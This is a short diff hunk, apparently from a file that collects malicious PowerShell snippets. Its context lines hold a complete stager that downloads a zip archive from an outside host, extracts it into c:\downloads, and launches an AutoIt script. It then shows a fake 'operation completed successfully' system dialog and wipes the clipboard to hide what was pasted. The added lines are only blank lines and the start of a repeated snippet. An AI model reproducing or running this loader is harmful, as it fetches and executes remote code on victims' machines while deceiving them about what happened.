@@ -26,6 +26,8 @@ Clear-Host;"
 invoke-expression "$vp = \"https://kostumn1.ilabserver.com/1.zip\";\r\n$be = \"c:\\\\downloads\";\r\nNew-Item -ItemType Directory -Force -Path $be;\r\nInvoke-WebRequest -Uri $vp -OutFile $be\\TU.zip;\r\nClear-Host;\r\nExpand-Archive $be\\TU.zip -Force -destinationpath $be;\r\nRemove-Item -Path $be\\TU.zip;\r\nStart-Process $be\\Autoit3.exe $be\\script.a3x\r\n[System.Reflection.Assembly]::LoadWithPartialName(\"System.Windows.Forms\");\r\n[System.Windows.Forms.MessageBox]::Show(\"The operation completed successfully, please reload the page\", \"System\", 0, 64);\r\nClear-Host;\r\n"
 set-clipboard -value "   "
 exit
+
+
 # powershell snippet 1
 $vp = "https://kostumn1.ilabserver.com/1.zip"
 $be = "c:\\\\downloads"
